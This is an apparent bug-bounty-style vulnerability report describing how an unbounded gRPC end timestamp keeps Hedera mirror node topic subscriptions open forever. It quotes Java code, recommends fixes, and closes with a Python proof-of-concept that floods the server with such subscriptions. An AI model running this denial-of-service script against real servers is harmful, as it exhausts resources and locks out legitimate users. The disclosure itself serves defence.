### Title
Unbounded `endTime` Enables Indefinite Stream Lifetime via `pastEndTime()` Loop — Resource Exhaustion DoS

### Summary
An unprivileged gRPC client can supply a `consensusEndTime` timestamp that maps to `Long.MAX_VALUE`, causing `isComplete()` to return `false` for ~236 years and the `pastEndTime()` `RepeatSpec` loop (with `Long.MAX_VALUE` repeats) to never complete. Because `takeUntilOther(pastEndTime(...))` only terminates the live stream when that flux completes, the stream — and all associated resources — remain alive indefinitely per connection. Flooding the server with such subscriptions exhausts gRPC connections, `boundedElastic` scheduler capacity, and heap memory.

### Finding Description

**Entry point — explicit `Long.MAX_VALUE` mapping:**

`ConsensusController.convertTimestamp()` (lines 76–81) explicitly converts any client-supplied `seconds >= 9223372035` to `Long.MAX_VALUE`:
```java
private long convertTimestamp(Timestamp timestamp) {
    if (timestamp.getSeconds() >= 9223372035L) {
        return Long.MAX_VALUE;
    }
    return DomainUtils.timestampInNanosMax(timestamp);
}
``` [1](#0-0) 

This value is passed directly as `filter.endTime` with no further clamping.

**Validation gap — no upper bound on `endTime`:**

`TopicMessageFilter.isValidEndTime()` only checks `endTime > startTime`; there is no `@Max` or wall-clock ceiling:
```java
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;
}
``` [2](#0-1) 

**`isComplete()` never returns `true` for `Long.MAX_VALUE`:**

```java
return Instant.ofEpochSecond(0, filter.getEndTime())
        .plus(grpcProperties.getEndTimeInterval())
        .isBefore(Instant.now());
``` [3](#0-2) 

`Instant.ofEpochSecond(0, Long.MAX_VALUE)` resolves to year ~2262. The condition is false until then.

**`pastEndTime()` loop — `Long.MAX_VALUE` repeats, never completes:**

```java
return Flux.empty()
        .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                .withFixedDelay(grpcProperties.getEndTimeInterval()));
``` [4](#0-3) 

`Flux.empty()` completes immediately; `repeatWhen` re-subscribes every 30 s as long as `!isComplete()`. With `endTime = Long.MAX_VALUE` this flux never completes, so `takeUntilOther(pastEndTime(...))` never fires and the live stream stays open.

**`boundedElastic` consumption path:**

`SharedTopicListener.listen()` calls `.publishOn(Schedulers.boundedElastic(), ...)` for every subscriber: [5](#0-4) 

`PollingTopicListener` creates its own `Schedulers.boundedElastic()` instance and uses it as the repeat scheduler: [6](#0-5) 

Each indefinitely-open subscription holds a slot in the bounded elastic pool for periodic dispatch and polling tasks.

### Impact Explanation

Each malicious subscription holds open: one gRPC server-side stream, one `TopicContext` object, one `topicListener` subscription (with its `publishOn(boundedElastic)` chain), and a periodic timer task firing every 30 s. With enough concurrent connections the bounded elastic thread pool (`10 × CPU` threads by default in Reactor) saturates, causing legitimate subscribers to queue indefinitely or be rejected. Memory grows linearly with connection count. The server cannot reclaim these resources until the client disconnects or the process restarts.

### Likelihood Explanation

No authentication or authorization is required — the gRPC `subscribeTopic` endpoint is publicly accessible. The exploit requires only a single well-formed gRPC call with `consensusEndTime.seconds = 9223372035`. It is trivially scriptable, repeatable, and requires no special knowledge beyond reading the Hedera SDK or protobuf schema. A single attacker with a modest number of persistent TCP connections can sustain the attack indefinitely.

### Recommendation

1. **Add an upper bound on `endTime`** in `TopicMessageFilter` — e.g., reject any `endTime` more than a configurable maximum duration (e.g., 30 days) beyond `Instant.now()`.
2. **Cap `convertTimestamp`** in `ConsensusController` to a reasonable ceiling rather than mapping to `Long.MAX_VALUE`.
3. **Add a per-subscriber connection timeout** in `NettyProperties` (e.g., `maxConnectionAge`) so no single stream can live beyond a server-enforced wall-clock limit regardless of `endTime`.
4. **Add a global subscriber count limit** — the `subscriberCount` gauge already exists; enforce a hard cap and reject new subscriptions when exceeded.

### Proof of Concept

```python
import grpc
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

# seconds >= 9223372035 maps to Long.MAX_VALUE in convertTimestamp()
far_future = timestamp_pb2.Timestamp(seconds=9223372036, nanos=0)
start      = timestamp_pb2.Timestamp(seconds=0, nanos=0)
topic      = basic_types_pb2.TopicID(topicNum=1)

query = consensus_service_pb2.ConsensusTopicQuery(
    topicID=topic,
    consensusStartTime=start,
    consensusEndTime=far_future,   # → endTime = Long.MAX_VALUE
)

# Open N connections; each stream lives until the client disconnects
for _ in range(200):
    stub.subscribeTopic(query)     # non-blocking; stream held open server-side

# Server's boundedElastic pool and connection table are now saturated.
# Legitimate subscribers receive no messages or are rejected.
input("Attack sustained. Press Enter to release connections.")
```
